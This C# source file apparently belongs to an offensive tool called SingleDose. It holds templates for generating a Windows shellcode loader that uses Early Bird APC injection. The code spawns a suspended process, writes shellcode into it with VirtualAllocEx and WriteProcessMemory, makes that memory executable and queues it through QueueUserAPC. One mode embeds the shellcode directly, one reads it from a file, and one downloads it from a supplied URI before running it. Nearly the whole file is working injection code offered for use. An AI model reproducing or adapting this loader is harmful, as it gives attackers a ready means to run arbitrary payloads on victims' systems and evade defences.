namespace SingleDose
{
    class EB_QUAPC
    {

        public static string STATICMODE = @"
            System.Collections.Generic.List<byte> bufList = new System.Collections.Generic.List<byte> { {{SHELLCODE}} };
            byte[] buf = bufList.ToArray();
            ";

        public static string DOWNLOADMODE = @"
            if (args.Contains(""-h"", StringComparer.OrdinalIgnoreCase) || !args.Contains(""-spawn"", StringComparer.OrdinalIgnoreCase) || !args.Contains(""-uri"", StringComparer.OrdinalIgnoreCase)) {
                Console.WriteLine(""-Spawn: Absolute filepath used to spawn process \n-URI: URI to download"");
                Environment.Exit(0);
            }

            ArgValues parsedArgs = ArgParse(args);
            System.Net.WebClient wc = new System.Net.WebClient();
            byte[] buf;
            buf = wc.DownloadData(parsedArgs.DownloadURI);
            
            if (buf.Length == 0)
            {
                Console.WriteLine(""[!] Error downloading"");
            }
            ";

        public static string DYNAMICMODE = @"
            if (args.Contains(""-h"", StringComparer.OrdinalIgnoreCase) || !args.Contains(""-spawn"", StringComparer.OrdinalIgnoreCase) || !args.Contains(""-bin"", StringComparer.OrdinalIgnoreCase)) {
                Console.WriteLine(""-Spawn: Absolute filepath used to spawn process \n-Bin: Path to shellcode"");
                Environment.Exit(0);
            }

            ArgValues parsedArgs = ArgParse(args);
            byte[] buf = System.IO.File.ReadAllBytes(parsedArgs.binPath);
";
        public static string DYNAMICARGPARSE = @"
        public class ArgValues
        {
            public string Spawn;
            public string binPath;
        }

        static ArgValues ArgParse(string[] arguments)
        {
            ArgValues collection = new ArgValues();

            if (arguments.Count() != 0)
            {
                for (var i = 0; i < arguments.Count(); i++)
                {
                    if (arguments[i].ToUpper().StartsWith(""-SPAWN"") && arguments[i + 1] != null)
                    {
                        if (System.IO.File.Exists(arguments[i + 1]))
                        {
                            collection.Spawn = System.IO.Path.GetFullPath(arguments[i + 1]);
                        }
                        else if (!System.IO.File.Exists(arguments[i + 1]))
                        {
                            Console.WriteLine(""[!] Invalid spawn path supplied."");
                            return null;
                        }
                    }

                    if (arguments[i].ToUpper().StartsWith(""-BIN"") && arguments[i + 1] != null)
                    {
                        if (System.IO.File.Exists(arguments[i + 1]))
                        {
                            collection.binPath = arguments[i + 1];
                        }
                        else if (!System.IO.File.Exists(arguments[i + 1]))
                        {
                            Console.WriteLine(""[!] Invalid bin path supplied."");
                            return null;
                        }
                    }
                }
            }
            else
            {
                Console.WriteLine(""[!] No args specified"");
            }
            return collection;
        }";
        
        public static string DOWNLOADARGPARSE = @"
        public class ArgValues
        {
            public string Spawn;
            public string DownloadURI;
        }

        static ArgValues ArgParse(string[] arguments)
        {
            ArgValues collection = new ArgValues();

            if (arguments.Count() != 0)
            {
                for (var i = 0; i < arguments.Count(); i++)
                {
                    if (arguments[i].ToUpper().StartsWith(""-SPAWN"") && arguments[i + 1] != null)
                    {
                        if (System.IO.File.Exists(arguments[i + 1]))
                        {
                            collection.Spawn = System.IO.Path.GetFullPath(arguments[i + 1]);
                        }
                        else if (!System.IO.File.Exists(arguments[i + 1]))
                        {
                            Console.WriteLine(""[!] Invalid path supplied."");
                            return null;
                        }
                    }

                    if (arguments[i].ToUpper().StartsWith(""-URI"") && arguments[i + 1] != null)
                    {
                        collection.DownloadURI = arguments[i + 1];
                    }
                }
            }
            else
            {
                Console.WriteLine(""[!] No args specified"");
            }
            return collection;
        }";
        
        public static string BODY = @"
using System;
using System.Linq;
using System.Runtime.InteropServices;

namespace {{NAMESPACE}}
{
    class Program
    {
        [DllImport(""kernel32.dll"", CallingConvention = CallingConvention.Winapi, CharSet = CharSet.Auto)]
        static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, ref SecurityAttributes lpProcessAttributes, ref SecurityAttributes lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment,
        string lpCurrentDirectory, [In] ref StartuprocInfo lpStartuprocInfo, out ProcessInfo lpProcessInformation);

        [DllImport(""kernel32.dll"", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, Int32 dwSize, AllocationType flAllocationType, MemoryProtection flProtect);

        [DllImport(""kernel32.dll"")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport(""kernel32.dll"", SetLastError = true)]
        static extern IntPtr OpenThread(ThreadAccess dwDesiredAccess, bool bInheritHandle, int dwThreadId);

        [DllImport(""kernel32.dll"")]
        public static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, int dwSize, uint flNewProtect, out uint lpflOldProtect);

        [DllImport(""kernel32.dll"", SetLastError = true)]
        public static extern IntPtr QueueUserAPC(IntPtr pfnAPC, IntPtr hThread, IntPtr dwData);

        [DllImport(""kernel32.dll"", SetLastError = true)]
        static extern uint ResumeThread(IntPtr hThread);



        #region Types

        #region CreateProcess Types

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
        public struct ProcessInfo
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public Int32 ProcessId;
            public Int32 ThreadId;
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
        public struct SecurityAttributes
        {
            public int length;
            public IntPtr lpSecurityDescriptor;
            public bool bInheritHandle;
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
        public struct StartuprocInfo
        {
            public uint cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public uint dwX;
            public uint dwY;
            public uint dwXSize;
            public uint dwYSize;
            public uint dwXCountChars;
            public uint dwYCountChars;
            public uint dwFillAttribute;
            public uint dwFlags;
            public short wShowWindow;
            public short cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }
        #endregion

        #region VirtualAllocEx Types
        public enum AllocationType
        {
            Commit = 0x1000,
            Reserve = 0x2000,
            Decommit = 0x4000,
            Release = 0x8000,
            Reset = 0x80000,
            Physical = 0x400000,
            TopDown = 0x100000,
            WriteWatch = 0x200000,
            LargePages = 0x20000000
        }
        public enum MemoryProtection
        {
            Execute = 0x10,
            ExecuteRead = 0x20,
            ExecuteReadWrite = 0x40,
            ExecuteWriteCopy = 0x80,
            NoAccess = 0x01,
            ReadOnly = 0x02,
            ReadWrite = 0x04,
            WriteCopy = 0x08,
            GuardModifierflag = 0x100,
            NoCacheModifierflag = 0x200,
            WriteCombineModifierflag = 0x400
        }
        #endregion

        #region OpenThread
        public enum ThreadAccess : int
        {
            TERMINATE = (0x0001),
            SUSPEND_RESUME = (0x0002),
            GET_CONTEXT = (0x0008),
            SET_CONTEXT = (0x0010),
            SET_INFORMATION = (0x0020),
            QUERY_INFORMATION = (0x0040),
            SET_THREAD_TOKEN = (0x0080),
            IMPERSONATE = (0x0100),
            DIRECT_IMPERSONATION = (0x0200)
        }
        #endregion //OpenThread

        #endregion //Defined Types


        static void Main(string[] args)
        {
            {{TRIGGER}}
            {{MODE}}
            StartuprocInfo sInfo = new StartuprocInfo();
            ProcessInfo procInfo;
            SecurityAttributes processSec = new SecurityAttributes();
            SecurityAttributes threadSec = new SecurityAttributes();
            processSec.length = Marshal.SizeOf(processSec);
            threadSec.length = Marshal.SizeOf(threadSec);

            if (CreateProcess( {{SPAWN}}, null, ref processSec, ref threadSec, false, 0x00000004, IntPtr.Zero, null, ref sInfo, out procInfo)) //0x00000004 == CreateSuspended
            {
                IntPtr baseAddress = VirtualAllocEx(procInfo.hProcess, IntPtr.Zero, buf.Length, AllocationType.Commit, MemoryProtection.ReadWrite);
                if (baseAddress == null)
                {
                    Console.WriteLine(""[!] VirtualAllocEx: {0}"", Marshal.GetLastWin32Error().ToString());
                    Console.WriteLine(""[!] Exiting."");
                    Environment.Exit(0);
                }
                IntPtr BytesWritten;
                WriteProcessMemory(procInfo.hProcess, baseAddress, buf, buf.Length, out BytesWritten);

                if (BytesWritten == IntPtr.Zero)
                {
                    Console.WriteLine(""[!] WriteProcessMemory: {0}"", Marshal.GetLastWin32Error().ToString());
                    Console.WriteLine(""[!] Exiting."");
                    Environment.Exit(0);
                }
                var hOThread = OpenThread(ThreadAccess.SET_CONTEXT, false, (int)procInfo.ThreadId);
                if (hOThread == null)
                {
                    Console.WriteLine(""[!] OpenThread: {0}"", Marshal.GetLastWin32Error().ToString());
                    Console.WriteLine(""[!] Exiting."");
                    Environment.Exit(0);
                }

                uint oldProtect;
                var VPExRet = VirtualProtectEx(procInfo.hProcess, baseAddress, buf.Length, (uint)MemoryProtection.ExecuteRead, out oldProtect);

                var retValue = QueueUserAPC(baseAddress, hOThread, IntPtr.Zero);
                if (retValue == IntPtr.Zero)
                {
                    Console.WriteLine(""[!] QueueUserAPC: {0}"", Marshal.GetLastWin32Error().ToString());
                    Console.WriteLine(""[!] Exiting."");
                    Environment.Exit(0);
                }

                ResumeThread(procInfo.hThread);
            }
            else
            {
                Console.WriteLine(""[!] CreateProcess: {0}"", Marshal.GetLastWin32Error().ToString());
            }
        }
        {{ARGS}}
    }
}
";
    }
}
